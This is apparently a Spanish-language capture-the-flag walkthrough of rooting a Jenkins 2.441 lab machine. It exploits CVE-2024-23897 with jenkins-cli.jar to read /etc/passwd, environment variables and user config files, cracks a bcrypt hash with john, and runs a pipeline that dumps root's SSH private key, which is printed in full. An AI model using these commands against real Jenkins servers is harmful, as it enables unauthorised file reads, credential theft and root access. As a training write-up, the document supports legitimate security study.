# intuition

Objetivo: Obtener acceso como root al sistema

**Pasos:**

1. Enumeración:

**Escanear puertos y descubrir que los puertos 22 (SSH) y 8080 (Jenkins) están abiertos.**

```bash
ports=$(nmap -p- --min-rate=1000 -T4 {target_IP} | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

nmap:  
 nmap es una herramienta de red utilizada para explorar y mapear redes.
-p- indica que se deben escanear todos los puertos del sistema remoto (0-65535).
--min-rate=1000 establece un límite de velocidad para el escaneo, para evitar que el sistema remoto se bloquee.
-T4 ajusta el nivel de intensidad del escaneo, lo que puede afectar la velocidad y la precisión del resultado.

grep ^:

    grep es una herramienta de línea de comandos que busca patrones en archivos o entradas estándar.
    ^ es el patrón que se busca. El ^ indica el comienzo de la línea, y [0-9] indica que se deben buscar solo caracteres numéricos.

cut -d '/' -f 1:

    cut es una herramienta que divide una cadena en segmentos según un delimitador y devuelve un segmento específico.
    -d '/' especifica que el delimitador es el carácter /.
    -f 1 indica que se debe devolver el primer segmento (el número de puerto).

tr '\n' ',':

    tr es una herramienta que traduce o reemplaza caracteres.
    '\n' es el carácter que se debe reemplazar (el salto de línea).
    , es el carácter que se debe utilizar para reemplazar los saltos de línea.

sed s/,$//:

    sed es una herramienta de edición de texto que permite realizar operaciones de búsqueda y reemplazo.
    s/,$// reemplaza el carácter , al final de la cadena con un espacio vacío ('').

nmap -p$ports -sV -sC 10.129.230.220:

    nmap es la herramienta de red utilizada para explorar el sistema remoto.
    -p$ports especifica los puertos que se deben escanear. En este caso, $ports es la variable que contiene la lista de puertos encontrados en el primer escaneo.
    -sV indica que se debe realizar un escaneo de versiones de los servicios.
    -sC indica que se debe realizar un escaneo de scripts de seguridad.

Enfocarse en la instancia de Jenkins ya que no se tienen credenciales para SSH.

```bash
nmap -p$ports -sV -sC {target_IP}
```

![s1](./imgs-builder/s1.png)

Como podemos ver tenemos los puertos 8080 y 22 abiertos con los servicios jenkins y ssh respectivamente, no tenemos credenciales para acceso ssh entonces nos enfocamos en jenkins.

**Enfocarse en la instancia de Jenkins ya que no se tienen credenciales para SSH.**

Accedemos al servicio de jenkins desde nuestro navegador con http://{target_IP}:8080

nos percatamos de la versión:

![s1.2](./imgs-builder/s2.png)

verificamos la version en CVE

![s1.3](./imgs-builder/i3.png)

observamos las vulnerabilidades del sofware Jenkins que son:

- CVE-2024-23898: Esta vulnerabilidad afecta a Jenkins versiones 2.217 hasta 2.441 (ambas incluidas), y las versiones LTS desde 2.222.1 hasta 2.426.2 (ambas incluidas). El problema es que Jenkins no valida correctamente el origen de las solicitudes hechas a través del punto final CLI WebSocket. Esto permite a un atacante secuestrar la conexión WebSocket y ejecutar comandos CLI en el servidor Jenkins.
  En términos simples, un atacante puede engañar al servidor Jenkins para que piense que las solicitudes maliciosas provienen de una fuente legítima, y así ejecutar comandos en el servidor que podrían comprometer el sistema.

- CVE-2024-23897: Esta vulnerabilidad afecta a Jenkins versión 2.441 y anteriores, y las versiones LTS 2.426.2 y anteriores. El problema radica en una funcionalidad del analizador de comandos CLI de Jenkins que no está deshabilitada correctamente. Esta funcionalidad reemplaza cualquier '@' seguido de una ruta de archivo en un argumento, por el contenido de ese archivo. Esto permite a un atacante sin autenticación leer archivos arbitrarios en el sistema de archivos del servidor Jenkins.
  En términos simples, un atacante puede enviar comandos especialmente diseñados al servidor Jenkins, y en lugar de ejecutar el comando directamente, Jenkins reemplazará parte del comando por el contenido de un archivo específico en el servidor. De esta manera, el atacante puede leer archivos sensibles del sistema, como contraseñas o claves SSH, sin tener ninguna credencial válida.

buscamos en la web la vulnerabilidad y si hay existen exploits para tal tarea

![s1.5](./imgs-builder/i5.png)

![s1.4](./imgs-builder/i4.png)

[explois CVE-2024-23897](https://github.com/3yujw7njai/CVE-2024-23897.git)

2. Explotación de la vulnerabilidad CVE-2024-23897:

Aprovechar una vulnerabilidad en la versión 2.441 de Jenkins que permite leer archivos arbitrarios como usuario no autenticado.
Usar jenkins-cli.jar para leer archivos como /etc/passwd y obtener información.

```bash
# Descargamos la CLI cliente de jenkins, herramienta para interactuar con jenkins
wget {target_IP}:8080/jnlpJars/jenkins-cli.jar
# Ejecutamos el comando de jenkins para mostrar el contenido del archivo /etc/passwd sin exito aparente
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://{target_IP}:8080' help "@/etc/passwd"
```

-noCertificateCheck: Esta opción indica que se omita la validación del certificado SSL/TLS al conectarse a Jenkins.

![s2.1](./imgs-builder/i6.png)

## Foothold (punto de apoyo)

Ahora que hemos confirmado que el exploit funciona, enumeremos el entorno del Instalación de Jenkins.

```bash
# ejecutamos el siguiente comando para obtener las variables de entorno
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/proc/self/environ"
# resultado:
ERROR: No such command HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin. Available commands are above.


# obtuvimos que Home esta ubicado en /var/jenkins_home de los cuales las variables que podemos tomar en cuenta para la etapa de escala de privilegios es:

JENKINS_HOME=/var/jenkins_home
HOSTNAME=0f52c222a4cc

# ejecutamos el siguiente comando para visualizar el archivo
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/var/jenkins_home/user.txt"
# la ruta completa del directorio del usuario builder
/var/jenkins_home
# obtener la primera bandera con:
java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node "@/var/jenkins_home/user.txt"
# con la flag
dba2ff7d3cbc590ff02a919c9d187a85
```

Los caracteres aleatorios en el nombre del HOSTNAME generalmente indican que estamos buscando dentro de un contenedor Docker.
Para continuar, nuestra mejor opción es crear un contenedor Docker local a partir del archivo oficial de Jenkins.
repositorio.

3. Obtener credenciales:

Creamos un contenedor de Docker de los repositorios oficiales de jenkins

```bash
sudo docker pull jenkins/jenkins:lts-jdk17
sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
```

al realizar la instalacion nos daran la contreña para acabar de configurar nuestra instancia de jenkins que usaremos posteriormente

![s2.2](./imgs-builder/i8.png)

Accedemos al contenedor desde el navegador, y colocamos las claves anteriormente mencionadas

![s2.3](./imgs-builder/i7.png)

No instalamos ningun complemento:

![s2.4](./imgs-builder/i9.png)

Creamos nuestro primer usuario:

![s2.5](./imgs-builder/i10.png)

En la página siguiente, llamada Configuración de instancia, simplemente seleccionamos "not now" y completamos nuestra instalación.

![s2.6](./imgs-builder/i11.png)

Cortamos la ejecucion de nuestro contenedor con el objetivo de acceder a el por consola

![s2.7](./imgs-builder/i12.png)

listamos los contenedores disponibles

![s2.8](./imgs-builder/i13.png)

Iniciamos el contenedor y accedemos a el desde su consola

![s2.9](./imgs-builder/i14.png)

Nos dirijimos al directorio raiz y listamos los archivos

```bash
cd
ls
```

Encontramos un interesante directorio "users", accedemos a el y listamos los archivos, para posteriormente leer ambos archivos con cat

![s2.10](./imgs-builder/i15.png)

![s2.11](./imgs-builder/i16.png)

Abrimos el directorio que tiene el mismonombre de usuario que configuramos adjunto a una cadena de texto aleatoria.

![s2.12](./imgs-builder/i17.png)

Del cual obtenemos nuestro hash de contraseña

```bash
<passwordHash>#jbcrypt:$2a$10$ZuR0naycyABb5PH26DIsNuLbrEHBOmAL21lj3nxCrNb.chGXs7RVi</passwordHash>
```

Entonces, hemos encontrado una forma válida de extraer hashes de contraseñas y nombres de usuarios de una instalación de Jenkins. Probémoslo en el servidor remoto usando la opción de lectura de archivos arbitrarios nos dirijimos a nuestra terminal y ejecutamos.

```bash
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://{target_IP}:8080'
help "@/var/jenkins_home/users/users.xml"
```

Pero solo obtenemos las 2 primeras lineas, se uso help en primer lugar para ver si el directorio y por ende el archivo existe

Ahora que sabemos que el archivo existe nos disponemos a usar node

```bash
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://{target_IP}:8080' connect-node "@/var/jenkins_home/users/users.xml"
```

Nota: El comando connect-node funcionó porque el atributo denyAnonymousReadAccess se configuró en falso en el host remoto (informacion que se obtiene al investigar la vulnerabilidad en el CVE 2024), lo que significa que tenemos privilegios de lectura como usuario anónimo.

![s2.12](./imgs-builder/i20.png)

De esta informacion lo mas relevante que obtenemo es:

```bash
# El usuario : jennifer
jennifer
# La ruta del dirctorio
jennifer_12108429903186576833
```

como ya habiamos visto en anteriores pasos, en jenkins dentro de esa ruta se almacena un archivo de configuración

![s2.13](./imgs-builder/i22.png)

Asi que deducimos que en esta isntancia de jenkins tambien ocurre lo mismo por lo tanto visualizamos lo que se encuentra en este archivo con esa nueva ruta

```bash
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://{target_IP}:8080' connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
```

![s2.14](./imgs-builder/i23.png)

De todo este mar de informacion solo nos importa es el passwordhash

```bash
<passwordHash>$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a<passwordHash>
```

![s2.15](./imgs-builder/i24.png)

guardamos el hash en un archivo y usamo john (herramienta de descifrado de contraseñas y hashes de seguridad)

![s2.16](./imgs-builder/i25.png)

La clave obtenida es **princess**

Usando el usuario y la contraseña princess podemos acceder a la instancia remota de jenkins

![s2.17](./imgs-builder/i26.png)

4. Escalar privilegios (Método 1):

Descubrir que hay una credencial SSH almacenada llamada "root".

Al acceder a la siguiente ruta:

```bash
    Panel de Control >Administrar Jenkins >Credentials >System >Global credentials > (unrestricted)

```

![s4.1](./imgs-builder/i27.png)

Creamos una nueva pipeline o trabajo

![s4.2](./imgs-builder/i28.png)

![s4.3](./imgs-builder/i29.png)

![s4.4](./imgs-builder/i30.png)

Colocamos el siguiente script

```bash
pipeline {
    agent any
    
    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@10.10.11.10 "cat /root/.ssh/id_rsa"'
                    }
                }
            }
        }
    }
}
```

Ahora guardamos y construimos

Finalmente en la salida que obtenemos copiamos la clave ssh generada:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
Esta clave la almacenamos en un archivo para tener acceso ssh remoto privilegiado le damos permisos.

```bash
chmod 600 file_password_ssh
```
accedemos a la maquina remota con:

```bash
ssh -i root_key root@{target_IP}
```

y obtenemos la bandera con:

```bash
cat root.txt
```
![finall](./imgs-builder/i35.png)

5. Escalar privilegios (Método 2):

Después de identificar el objeto de credencial SSH, inspeccionar el código fuente y obtener la clave SSH encriptada.
Usar un script en Jenkins para desencriptar la clave SSH.
Utilizar la clave desencriptada para obtener acceso SSH como root.
